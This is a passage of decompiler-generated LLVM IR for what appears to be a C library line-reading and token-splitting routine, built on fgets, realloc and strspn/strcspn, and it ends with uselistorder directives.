  %v4_1756c = inttoptr i32 %v3_1756c to i32*
  %v5_1756c = load i32, i32* %v4_1756c, align 4
  %v2_17570 = add i32 %v2_1756c, %v0_17570
  store i32 %v2_17570, i32* %r0.global-to-local, align 4
  %v2_17574 = sub i32 %v5_1756c, %v0_17570
  %v1_17578 = inttoptr i32 %v0_17568 to i32*
  %v2_17578 = load i32, i32* %v1_17578, align 4
  store i32 %v2_17578, i32* %r2.global-to-local, align 4
  %v3_1757c = call i32 @fgets(i32 %v2_17570, i32 %v2_17574, i32 %v2_17578)
  store i32 %v3_1757c, i32* %r0.global-to-local, align 4
  store i32 %v3_1757c, i32* %r4.global-to-local, align 4
  %v2_17580 = icmp eq i32 %v3_1757c, 0
  store i1 %v2_17580, i1* %cpsr_z.global-to-local, align 1
  %v0_17588 = load i32, i32* @r5, align 4
  %v1_17588 = add i32 %v0_17588, 12
  br i1 %v2_17580, label %dec_label_pc_17588, label %dec_label_pc_175a0

dec_label_pc_17588:                               ; preds = %dec_label_pc_17568
  store i32 %v1_17588, i32* %r0.global-to-local, align 4
  %v1_1758c = inttoptr i32 %v1_17588 to i32*
  %v2_1758c = load i32, i32* %v1_1758c, align 4
  store i32 %v2_1758c, i32* %r0.global-to-local, align 4
  %v3_1758c = add i32 %v0_17588, 16
  %v4_1758c = inttoptr i32 %v3_1758c to i32*
  %v5_1758c = load i32, i32* %v4_1758c, align 4
  store i32 %v5_1758c, i32* %r2.global-to-local, align 4
  %v3_17594 = inttoptr i32 %v2_1758c to i8*
  %v4_17594 = call i32 @__GI_memset(i8* %v3_17594, i32 0, i32 %v5_1758c)
  store i32 %v4_17594, i32* %r0.global-to-local, align 4
  %v0_17598 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_177b8

dec_label_pc_175a0:                               ; preds = %dec_label_pc_17568
  %v2_175a0 = inttoptr i32 %v1_17588 to i32*
  %v3_175a0 = load i32, i32* %v2_175a0, align 4
  store i32 %v3_175a0, i32* @r4, align 4
  %v1_175a4 = load i32, i32* @r6, align 4
  %v2_175a4 = add i32 %v1_175a4, %v3_175a0
  %v3_175a4 = inttoptr i32 %v2_175a4 to i8*
  store i32 %v2_175a4, i32* %r0.global-to-local, align 4
  %v3_175a8 = call i32 @strlen(i8* %v3_175a4)
  %v0_175b0 = load i32, i32* @r6, align 4
  %v2_175b0 = add i32 %v0_175b0, %v3_175a8
  store i32 %v2_175b0, i32* @r6, align 4
  %v0_175b4 = load i32, i32* @r4, align 4
  store i32 %v0_175b4, i32* @r0, align 4
  %v2_175b8 = call i32 @__GI_strchr(i32 %v0_175b4, i32 10)
  store i32 %v2_175b8, i32* %r0.global-to-local, align 4
  %v2_175bc = icmp eq i32 %v2_175b8, 0
  store i1 %v2_175bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175bc, label %dec_label_pc_175e8, label %dec_label_pc_175c4

dec_label_pc_175c4:                               ; preds = %dec_label_pc_175a0
  %v1_175c4 = inttoptr i32 %v2_175b8 to i8*
  %v2_175c4 = load i8, i8* %v1_175c4, align 1
  %v3_175c4 = zext i8 %v2_175c4 to i32
  %v1_175c8 = add nuw nsw i32 %v3_175c4, 255
  %v1_175cc = urem i32 %v1_175c8, 256
  store i32 %v1_175cc, i32* %r3.global-to-local, align 4
  %v7_175d0 = icmp eq i32 %v1_175cc, 92
  store i1 %v7_175d0, i1* %cpsr_z.global-to-local, align 1
  %v1_175d4 = trunc i32 %v1_175c8 to i8
  store i8 %v1_175d4, i8* %v1_175c4, align 1
  %v0_175d8 = load i32, i32* @r6, align 4
  %v1_175d8 = add i32 %v0_175d8, -1
  store i32 %v1_175d8, i32* @r6, align 4
  %v0_175dc = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_175dc, label %dec_label_pc_175e0, label %dec_label_pc_1766c

dec_label_pc_175e0:                               ; preds = %dec_label_pc_175c4
  %v1_175e0 = add i32 %v0_175d8, -2
  store i32 %v1_175e0, i32* @r6, align 4
  br label %dec_label_pc_17568

dec_label_pc_175e8:                               ; preds = %dec_label_pc_175a0
  %v0_175e8 = load i32, i32* @r5, align 4
  %v1_175e8 = add i32 %v0_175e8, 20
  %v2_175e8 = inttoptr i32 %v1_175e8 to i32*
  %v3_175e8 = load i32, i32* %v2_175e8, align 4
  store i32 %v3_175e8, i32* %r3.global-to-local, align 4
  %v2_175ec = icmp eq i32 %v3_175e8, 0
  store i1 %v2_175ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_175ec, label %dec_label_pc_17624, label %dec_label_pc_175f4

dec_label_pc_175f4:                               ; preds = %dec_label_pc_175e8
  %v1_175f4 = add i32 %v0_175e8, 16
  %v2_175f4 = inttoptr i32 %v1_175f4 to i32*
  %v3_175f4 = load i32, i32* %v2_175f4, align 4
  store i32 %v3_175f4, i32* %r3.global-to-local, align 4
  %v1_175f8 = add i32 %v0_175e8, 8
  %v2_175f8 = inttoptr i32 %v1_175f8 to i32*
  %v3_175f8 = load i32, i32* %v2_175f8, align 4
  %v1_175fc = add i32 %v3_175f4, 4096
  store i32 %v1_175fc, i32* %r3.global-to-local, align 4
  %v2_17600 = add i32 %v3_175f8, %v1_175fc
  store i32 %v1_175fc, i32* %v2_175f4, align 4
  %v0_17608 = load i32, i32* @r5, align 4
  %v1_17608 = add i32 %v0_17608, 4
  %v2_17608 = inttoptr i32 %v1_17608 to i32*
  %v3_17608 = load i32, i32* %v2_17608, align 4
  store i32 %v3_17608, i32* %r0.global-to-local, align 4
  %v4_1760c = inttoptr i32 %v3_17608 to i32*
  %v5_1760c = call i32 @realloc(i32* %v4_1760c, i32 %v2_17600, i32 %v2_17578, i32 %v1_175fc)
  store i32 %v5_1760c, i32* %r0.global-to-local, align 4
  %v0_17610 = load i32, i32* @r5, align 4
  %v1_17610 = add i32 %v0_17610, 8
  %v2_17610 = inttoptr i32 %v1_17610 to i32*
  %v3_17610 = load i32, i32* %v2_17610, align 4
  %v2_17614 = add i32 %v3_17610, %v5_1760c
  store i32 %v2_17614, i32* %r3.global-to-local, align 4
  %v2_17618 = add i32 %v0_17610, 12
  %v3_17618 = inttoptr i32 %v2_17618 to i32*
  store i32 %v2_17614, i32* %v3_17618, align 4
  %v1_1761c = load i32, i32* @r5, align 4
  %v2_1761c = add i32 %v1_1761c, 4
  %v3_1761c = inttoptr i32 %v2_1761c to i32*
  store i32 %v5_1760c, i32* %v3_1761c, align 4
  %v0_17570.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17568

dec_label_pc_17624:                               ; preds = %dec_label_pc_175e8, %.dec_label_pc_17624_crit_edge
  %v0_17624 = phi i32 [ %v0_17624.pre, %.dec_label_pc_17624_crit_edge ], [ %v0_175e8, %dec_label_pc_175e8 ]
  %v1_17624 = inttoptr i32 %v0_17624 to i32*
  %v2_17624 = load i32, i32* %v1_17624, align 4
  %v1_17628 = add i32 %v2_17624, 52
  %v2_17628 = inttoptr i32 %v1_17628 to i32*
  %v3_17628 = load i32, i32* %v2_17628, align 4
  store i32 %v3_17628, i32* %r3.global-to-local, align 4
  %v2_1762c = icmp eq i32 %v3_17628, 0
  store i1 %v2_1762c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1762c, label %dec_label_pc_17658, label %dec_label_pc_17634

dec_label_pc_17634:                               ; preds = %dec_label_pc_17624
  %v1_17634 = add i32 %v2_17624, 16
  %v2_17634 = inttoptr i32 %v1_17634 to i32*
  %v3_17634 = load i32, i32* %v2_17634, align 4
  store i32 %v3_17634, i32* %r2.global-to-local, align 4
  %v1_17638 = add i32 %v2_17624, 24
  %v2_17638 = inttoptr i32 %v1_17638 to i32*
  %v3_17638 = load i32, i32* %v2_17638, align 4
  store i32 %v3_17638, i32* %r3.global-to-local, align 4
  %v3_1763c = icmp ult i32 %v3_17634, %v3_17638
  %v9_1763c = icmp eq i32 %v3_17634, %v3_17638
  store i1 %v9_1763c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_1763c, label %dec_label_pc_17660thread-pre-split, label %dec_label_pc_1764c

dec_label_pc_1764c:                               ; preds = %dec_label_pc_17634
  store i32 %v2_17624, i32* %r0.global-to-local, align 4
  %v1_17650 = inttoptr i32 %v2_17624 to i16*
  %v2_17650 = call i32 @getc_unlocked(i16* %v1_17650)
  store i32 %v2_17650, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17660

dec_label_pc_17658:                               ; preds = %dec_label_pc_17624
  store i32 %v2_17624, i32* %r0.global-to-local, align 4
  %v1_1765c = call i32 @__GI_fgetc(i32 %v2_17624)
  store i32 %v1_1765c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17660

dec_label_pc_17660thread-pre-split:               ; preds = %dec_label_pc_17634
  %v2_17640 = inttoptr i32 %v3_17634 to i8*
  %v3_17640 = load i8, i8* %v2_17640, align 1
  %v4_17640 = zext i8 %v3_17640 to i32
  store i32 %v4_17640, i32* %r0.global-to-local, align 4
  %v6_17640 = add i32 %v3_17634, 1
  store i32 %v6_17640, i32* %r2.global-to-local, align 4
  store i32 %v6_17640, i32* %v2_17634, align 4
  %v0_17660.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17660

dec_label_pc_17660:                               ; preds = %dec_label_pc_17660thread-pre-split, %dec_label_pc_1764c, %dec_label_pc_17658
  %v1_17664 = phi i32 [ %v0_17660.pr, %dec_label_pc_17660thread-pre-split ], [ %v2_17650, %dec_label_pc_1764c ], [ %v1_1765c, %dec_label_pc_17658 ]
  %v7_17660 = icmp eq i32 %v1_17664, 10
  store i1 %v7_17660, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17660, label %dec_label_pc_1766c.loopexit, label %bb66

bb66:                                             ; preds = %dec_label_pc_17660
  %v8_17664 = icmp eq i32 %v1_17664, -1
  store i1 %v8_17664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_17664, label %dec_label_pc_1766c.loopexit, label %.dec_label_pc_17624_crit_edge

.dec_label_pc_17624_crit_edge:                    ; preds = %bb66
  %v0_17624.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17624

dec_label_pc_1766c.loopexit:                      ; preds = %bb66, %dec_label_pc_17660
  %v0_1766c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1766c

dec_label_pc_1766c:                               ; preds = %dec_label_pc_175c4, %dec_label_pc_1766c.loopexit
  %v0_1766c = phi i32 [ %v0_1766c.pre, %dec_label_pc_1766c.loopexit ], [ %v1_175d8, %dec_label_pc_175c4 ]
  %v7_1766c = icmp eq i32 %v0_1766c, -1
  store i1 %v7_1766c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1766c, label %dec_label_pc_177b4, label %dec_label_pc_17674

dec_label_pc_17674:                               ; preds = %dec_label_pc_1766c
  store i32 %v1_174dc, i32* %r3.global-to-local, align 4
  store i1 %v2_17678, i1* %cpsr_z.global-to-local, align 1
  %v0_1767c = load i32, i32* @r5, align 4
  %v1_1767c = add i32 %v0_1767c, 12
  %v2_1767c = inttoptr i32 %v1_1767c to i32*
  %v3_1767c = load i32, i32* %v2_1767c, align 4
  store i32 %v3_1767c, i32* @r4, align 4
  br i1 %v2_17678, label %dec_label_pc_17694, label %dec_label_pc_17684

dec_label_pc_17684:                               ; preds = %dec_label_pc_17674
  store i32 %v3_1767c, i32* @r0, align 4
  %v0_17688 = load i32, i32* @sl, align 4
  %v2_1768c = inttoptr i32 %v3_1767c to i8*
  %v3_1768c = call i32 @__GI_strspn(i8* %v2_1768c, i32 %v0_17688)
  store i32 %v3_1768c, i32* %r0.global-to-local, align 4
  %v0_17690 = load i32, i32* @r4, align 4
  %v2_17690 = add i32 %v0_17690, %v3_1768c
  store i32 %v2_17690, i32* @r4, align 4
  br label %dec_label_pc_17694

dec_label_pc_17694:                               ; preds = %dec_label_pc_17674, %dec_label_pc_17684
  %v0_17694 = phi i32 [ %v3_1767c, %dec_label_pc_17674 ], [ %v2_17690, %dec_label_pc_17684 ]
  %v1_17694 = inttoptr i32 %v0_17694 to i8*
  %v2_17694 = load i8, i8* %v1_17694, align 1
  %v3_17694 = zext i8 %v2_17694 to i32
  store i32 %v3_17694, i32* %r2.global-to-local, align 4
  %v2_17698 = icmp eq i8 %v2_17694, 0
  store i1 %v2_17698, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17698, label %dec_label_pc_17504.backedge, label %dec_label_pc_176a0

dec_label_pc_17504.backedge:                      ; preds = %dec_label_pc_17694, %dec_label_pc_176a0, %dec_label_pc_177ac
  %v0_17504.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17504

dec_label_pc_176a0:                               ; preds = %dec_label_pc_17694
  %v0_176a0 = load i32, i32* @r7, align 4
  %v1_176a0 = inttoptr i32 %v0_176a0 to i8*
  %v2_176a0 = load i8, i8* %v1_176a0, align 1
  %v3_176a0 = zext i8 %v2_176a0 to i32
  store i32 %v3_176a0, i32* %r3.global-to-local, align 4
  %v9_176a4 = icmp eq i8 %v2_176a0, %v2_17694
  store i1 %v9_176a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_176a4, label %dec_label_pc_17504.backedge, label %dec_label_pc_176ac

dec_label_pc_176ac:                               ; preds = %dec_label_pc_176a0
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_176b0 = load i32, i32* @r5, align 4
  %v1_176b0 = add i32 %v0_176b0, 4
  %v2_176b0 = inttoptr i32 %v1_176b0 to i32*
  %v3_176b0 = load i32, i32* %v2_176b0, align 4
  store i32 %v3_176b0, i32* %r0.global-to-local, align 4
  %v0_176b4 = load i32, i32* @fp, align 4
  store i32 %v3_176b0, i32* %v1_176d0, align 4
  store i32 %v3_174c8, i32* %r2.global-to-local, align 4
  %v3_176c0 = inttoptr i32 %v3_176b0 to i8*
  %v4_176c0 = call i32 @__GI_memset(i8* %v3_176c0, i32 %v0_176b4, i32 %v3_174c8)
  store i32 %v4_176c0, i32* %r0.global-to-local, align 4
  %v0_176c4 = load i32, i32* @fp, align 4
  store i32 %v0_176c4, i32* @r6, align 4
  %v0_1778412 = load i32, i32* @r4, align 4
  %v1_1778413 = inttoptr i32 %v0_1778412 to i8*
  %v2_1778414 = load i8, i8* %v1_1778413, align 1
  %v3_1778415 = zext i8 %v2_1778414 to i32
  store i32 %v3_1778415, i32* %r2.global-to-local, align 4
  %v2_1778816 = icmp eq i8 %v2_1778414, 0
  store i1 %v2_1778816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1778816, label %dec_label_pc_177a0, label %dec_label_pc_17790

dec_label_pc_176cc:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_176d0 = load i32, i32* %v1_176d0, align 4
  store i32 %v2_176d0, i32* %r3.global-to-local, align 4
  store i32 %v1_174e0, i32* %r2.global-to-local, align 4
  %v9_176d8 = icmp eq i32 %v2_176dc, %v1_174e0
  store i1 %v9_176d8, i1* %cpsr_z.global-to-local, align 1
  %v5_176dc = mul i32 %v2_176dc, 4
  %v6_176dc = add i32 %v2_176d0, %v5_176dc
  %v7_176dc = inttoptr i32 %v6_176dc to i32*
  store i32 %v0_176dc, i32* %v7_176dc, align 4
  br i1 %v9_176d8, label %dec_label_pc_176e4, label %dec_label_pc_176f0

dec_label_pc_176e4:                               ; preds = %dec_label_pc_176cc
  store i32 %v1_174ec, i32* %r3.global-to-local, align 4
  store i1 %v2_176e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_176e8, label %dec_label_pc_176f0, label %dec_label_pc_17710

dec_label_pc_176f0:                               ; preds = %dec_label_pc_176e4, %dec_label_pc_176cc
  %v0_176f0 = load i32, i32* @r7, align 4
  %v1_176f0 = inttoptr i32 %v0_176f0 to i8*
  %v2_176f0 = load i8, i8* %v1_176f0, align 1
  %v3_176f0 = zext i8 %v2_176f0 to i32
  store i32 %v3_176f0, i32* %r3.global-to-local, align 4
  %v2_176f4 = icmp eq i8 %v2_176f0, 0
  store i1 %v2_176f4, i1* %cpsr_z.global-to-local, align 1
  %v0_176f8 = load i32, i32* @r4, align 4
  store i32 %v0_176f8, i32* @r0, align 4
  %v1_176fc = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_176f4, i32 %v1_176fc, i32 %v0_176f0
  store i32 %storemerge, i32* @r1, align 4
  %v0_17704 = call i32 @strcspn()
  store i32 %v0_17704, i32* %r0.global-to-local, align 4
  %v0_17708 = load i32, i32* @r4, align 4
  %v2_17708 = add i32 %v0_17708, %v0_17704
  store i32 %v2_17708, i32* @r4, align 4
  br label %dec_label_pc_17748

dec_label_pc_17710:                               ; preds = %dec_label_pc_176e4
  %v0_17710 = load i32, i32* @r4, align 4
  store i32 %v0_17710, i32* @r0, align 4
  %v0_17714 = load i32, i32* @r7, align 4
  %v1_17714 = inttoptr i32 %v0_17714 to i8*
  %v2_17714 = load i8, i8* %v1_17714, align 1
  %v3_17714 = zext i8 %v2_17714 to i32
  %v5_17718 = call i32 @__GI_strchrnul(i32 %v0_17710, i32 %v3_17714, i32 %v1_174e0, i32 %v1_174ec)
  store i32 %v5_17718, i32* %r0.global-to-local, align 4
  store i32 %v1_174dc, i32* %r2.global-to-local, align 4
  store i1 %v2_17678, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_17718, i32* @r4, align 4
  br i1 %v2_17678, label %dec_label_pc_17748, label %dec_label_pc_17734

dec_label_pc_17730:                               ; preds = %dec_label_pc_17734
  %v1_17730 = add i32 %v0_17748.pre, -1
  store i32 %v1_17730, i32* @r4, align 4
  br label %dec_label_pc_17734

dec_label_pc_17734:                               ; preds = %dec_label_pc_17710, %dec_label_pc_17730
  %v0_17734 = phi i32 [ %v1_17730, %dec_label_pc_17730 ], [ %v5_17718, %dec_label_pc_17710 ]
  %v1_17734 = add i32 %v0_17734, -1
  %v2_17734 = inttoptr i32 %v1_17734 to i8*
  %v3_17734 = load i8, i8* %v2_17734, align 1
  %v4_17734 = zext i8 %v3_17734 to i32
  %v0_17738 = load i32, i32* @sl, align 4
  store i32 %v0_17738, i32* @r0, align 4
  %v2_1773c = call i32 @__GI_strchr(i32 %v0_17738, i32 %v4_17734)
  store i32 %v2_1773c, i32* %r0.global-to-local, align 4
  %v2_17740 = icmp eq i32 %v2_1773c, 0
  store i1 %v2_17740, i1* %cpsr_z.global-to-local, align 1
  %v0_17748.pre = load i32, i32* @r4, align 4
  br i1 %v2_17740, label %dec_label_pc_17748, label %dec_label_pc_17730

dec_label_pc_17748:                               ; preds = %dec_label_pc_17734, %dec_label_pc_17710, %dec_label_pc_176f0
  %v3_17754 = phi i32 [ %v5_17718, %dec_label_pc_17710 ], [ %v2_17708, %dec_label_pc_176f0 ], [ %v0_17748.pre, %dec_label_pc_17734 ]
  %v1_17748 = inttoptr i32 %v3_17754 to i8*
  %v2_17748 = load i8, i8* %v1_17748, align 1
  %v3_17748 = zext i8 %v2_17748 to i32
  store i32 %v3_17748, i32* %r2.global-to-local, align 4
  %v0_1774c = load i32, i32* @r7, align 4
  %v1_1774c = inttoptr i32 %v0_1774c to i8*
  %v2_1774c = load i8, i8* %v1_1774c, align 1
  %v3_1774c = zext i8 %v2_1774c to i32
  store i32 %v3_1774c, i32* %r3.global-to-local, align 4
  %v9_17750 = icmp eq i8 %v2_1774c, %v2_17748
  store i1 %v9_17750, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17750, label %bb69, label %dec_label_pc_1775c

bb69:                                             ; preds = %dec_label_pc_17748
  %v1_17754 = load i32, i32* @fp, align 4
  %v2_17754 = trunc i32 %v1_17754 to i8
  store i8 %v2_17754, i8* %v1_17748, align 1
  %v0_17758.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17758.pr, label %bb71, label %.dec_label_pc_1775c_crit_edge

.dec_label_pc_1775c_crit_edge:                    ; preds = %bb69
  %v0_1775c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1775c

dec_label_pc_1775c:                               ; preds = %.dec_label_pc_1775c_crit_edge, %dec_label_pc_17748
  %v0_1775c = phi i32 [ %v0_1775c.pre, %.dec_label_pc_1775c_crit_edge ], [ %v3_17748, %dec_label_pc_17748 ]
  %v2_1775c = icmp eq i32 %v0_1775c, 0
  store i1 %v2_1775c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1775c, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_1775c
  %v1_17760 = load i32, i32* @fp, align 4
  %v2_17760 = trunc i32 %v1_17760 to i8
  %v3_17760 = load i32, i32* @r4, align 4
  %v4_17760 = inttoptr i32 %v3_17760 to i8*
  store i8 %v2_17760, i8* %v4_17760, align 1
  %v5_17760 = load i32, i32* @r4, align 4
  %v6_17760 = add i32 %v5_17760, 1
  store i32 %v6_17760, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_1775c, %bb70
  %v2_17764 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_17764, i32* %r3.global-to-local, align 4
  %v2_17768 = icmp eq i32 %v2_17764, 0
  store i1 %v2_17768, i1* %cpsr_z.global-to-local, align 1
  %v0_17784.pre = load i32, i32* @r4, align 4
  br i1 %v2_17768, label %dec_label_pc_17780, label %dec_label_pc_17770

dec_label_pc_17770:                               ; preds = %bb71
  store i32 %v0_17784.pre, i32* @r0, align 4
  %v0_17774 = load i32, i32* @sl, align 4
  %v2_17778 = inttoptr i32 %v0_17784.pre to i8*
  %v3_17778 = call i32 @__GI_strspn(i8* %v2_17778, i32 %v0_17774)
  store i32 %v3_17778, i32* %r0.global-to-local, align 4
  %v0_1777c = load i32, i32* @r4, align 4
  %v2_1777c = add i32 %v0_1777c, %v3_17778
  store i32 %v2_1777c, i32* @r4, align 4
  br label %dec_label_pc_17780

dec_label_pc_17780:                               ; preds = %bb71, %dec_label_pc_17770
  %v0_17784 = phi i32 [ %v2_1777c, %dec_label_pc_17770 ], [ %v0_17784.pre, %bb71 ]
  %v0_17780 = load i32, i32* @r6, align 4
  %v1_17780 = add i32 %v0_17780, 1
  store i32 %v1_17780, i32* @r6, align 4
  %v1_17784 = inttoptr i32 %v0_17784 to i8*
  %v2_17784 = load i8, i8* %v1_17784, align 1
  %v3_17784 = zext i8 %v2_17784 to i32
  store i32 %v3_17784, i32* %r2.global-to-local, align 4
  %v2_17788 = icmp eq i8 %v2_17784, 0
  store i1 %v2_17788, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17788, label %dec_label_pc_177a0, label %dec_label_pc_17790

dec_label_pc_17790:                               ; preds = %dec_label_pc_176ac, %dec_label_pc_17780
  %v0_176dc = phi i32 [ %v0_17784, %dec_label_pc_17780 ], [ %v0_1778412, %dec_label_pc_176ac ]
  %v2_176dc = phi i32 [ %v1_17780, %dec_label_pc_17780 ], [ %v0_176c4, %dec_label_pc_176ac ]
  %v1_17794 = phi i32 [ %v3_17784, %dec_label_pc_17780 ], [ %v3_1778415, %dec_label_pc_176ac ]
  %v0_17790 = load i32, i32* @r7, align 4
  %v1_17790 = inttoptr i32 %v0_17790 to i8*
  %v2_17790 = load i8, i8* %v1_17790, align 1
  %v3_17790 = zext i8 %v2_17790 to i32
  store i32 %v3_17790, i32* %r3.global-to-local, align 4
  %v9_17794 = icmp eq i32 %v3_17790, %v1_17794
  store i1 %v9_17794, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17794, label %dec_label_pc_177a0, label %bb72

bb72:                                             ; preds = %dec_label_pc_17790
  %v2_17798 = load i32, i32* @sb, align 4
  %v3_17798 = sub i32 %v2_176dc, %v2_17798
  %v5_17798 = xor i32 %v2_17798, %v2_176dc
  %v6_17798 = xor i32 %v3_17798, %v2_176dc
  %v7_17798 = and i32 %v6_17798, %v5_17798
  %v8_17798 = icmp slt i32 %v7_17798, 0
  %v9_17798 = icmp slt i32 %v3_17798, 0
  %v10_17798 = icmp eq i32 %v2_176dc, %v2_17798
  store i1 %v10_17798, i1* %cpsr_z.global-to-local, align 1
  %v2_1779c = xor i1 %v9_17798, %v8_17798
  br i1 %v2_1779c, label %dec_label_pc_176cc, label %dec_label_pc_177a0

dec_label_pc_177a0:                               ; preds = %dec_label_pc_17790, %dec_label_pc_17780, %bb72, %dec_label_pc_176ac
  %v0_177a4 = phi i32 [ %v0_176c4, %dec_label_pc_176ac ], [ %v2_176dc, %dec_label_pc_17790 ], [ %v1_17780, %dec_label_pc_17780 ], [ %v2_176dc, %bb72 ]
  store i32 %v3_174c4, i32* %r2.global-to-local, align 4
  %v9_177a4 = icmp eq i32 %v0_177a4, %v3_174c4
  store i1 %v9_177a4, i1* %cpsr_z.global-to-local, align 1
  %v6_177a8 = icmp slt i32 %v0_177a4, %v3_174c4
  br i1 %v6_177a8, label %dec_label_pc_177ac, label %dec_label_pc_177b8

dec_label_pc_177ac:                               ; preds = %dec_label_pc_177a0
  %v0_177ac = load i32, i32* @r8, align 4
  %v1_177ac = and i32 %v0_177ac, 1048576
  %v2_177ac = icmp eq i32 %v1_177ac, 0
  store i1 %v2_177ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_177ac, label %dec_label_pc_17504.backedge, label %dec_label_pc_177b4

dec_label_pc_177b4:                               ; preds = %dec_label_pc_177ac, %dec_label_pc_1766c, %.thread, %entry
  br label %dec_label_pc_177b8

dec_label_pc_177b8:                               ; preds = %dec_label_pc_177a0, %dec_label_pc_17588, %dec_label_pc_177b4
  %v0_177b8 = phi i32 [ %v0_17598, %dec_label_pc_17588 ], [ 0, %dec_label_pc_177b4 ], [ %v0_177a4, %dec_label_pc_177a0 ]
  store i32 %v0_177b8, i32* %r0.global-to-local, align 4
  store i32 %v3_174a0, i32* @r4, align 4
  store i32 %v6_174a0, i32* @r5, align 4
  store i32 %v9_174a0, i32* @r6, align 4
  store i32 %v12_174a0, i32* @r7, align 4
  store i32 %v15_174a0, i32* @r8, align 4
  store i32 %v18_174a0, i32* @sb, align 4
  store i32 %v21_174a0, i32* @sl, align 4
  store i32 %v24_174a0, i32* @fp, align 4
  ret i32 %v0_177b8

; uselistorder directives
  uselistorder i32 %v0_177b8, { 1, 0 }
  uselistorder i32 %v0_177a4, { 0, 2, 1 }
  uselistorder i32 %v3_17798, { 1, 0 }
  uselistorder i32 %v2_17798, { 1, 0, 2 }
  uselistorder i32 %v2_176dc, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_17784.pre, { 0, 2, 1 }
  uselistorder i32 %v5_17718, { 1, 0, 2, 3 }
  uselistorder i32 %v0_176c4, { 1, 0, 2 }
  uselistorder i1 %v9_176a4, { 1, 0 }
  uselistorder i32 %v3_1767c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_1766c, { 1, 0 }
  uselistorder i1 %v8_17664, { 1, 0 }
  uselistorder i32 %v3_17634, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_17624, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v5_1760c, { 1, 0, 2 }
  uselistorder i32 %v1_175fc, { 1, 2, 0, 3 }
  uselistorder i32 %v0_175e8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_175e0, { 1, 0 }
  uselistorder i32 %v1_175cc, { 1, 0 }
  uselistorder i32 %v1_175c8, { 1, 0 }
  uselistorder i32 %v2_175a4, { 1, 0 }
  uselistorder i32 %v1_17588, { 2, 0, 1 }
  uselistorder i32 %v0_17570, { 1, 0 }
  uselistorder i32 %v1_17560, { 0, 2, 1 }
  uselistorder i32* %v1_176d0, { 1, 0 }
  uselistorder i1 %v2_17678, { 1, 0, 2, 3 }
  uselistorder i32 %v1_174ec, { 2, 0, 1, 3 }
  uselistorder i32 %v1_174e0, { 2, 1, 0 }
  uselistorder i32 %v3_174c8, { 1, 2, 0 }
  uselistorder i32 %v3_174c4, { 2, 1, 0 }
  uselistorder i32 %v1_174bc, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 2, 1, 3, 0 }
  uselistorder i32 (i32*, i32, i32, i32)* @realloc, { 0, 12, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_177b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_177a0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17790, { 1, 0 }
  uselistorder label %dec_label_pc_17780, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17734, { 1, 0 }
  uselistorder label %dec_label_pc_17504.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17694, { 1, 0 }
  uselistorder label %dec_label_pc_1766c, { 1, 0 }
  uselistorder label %dec_label_pc_17660, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17624, { 1, 0 }
  uselistorder label %dec_label_pc_17558, { 1, 0 }
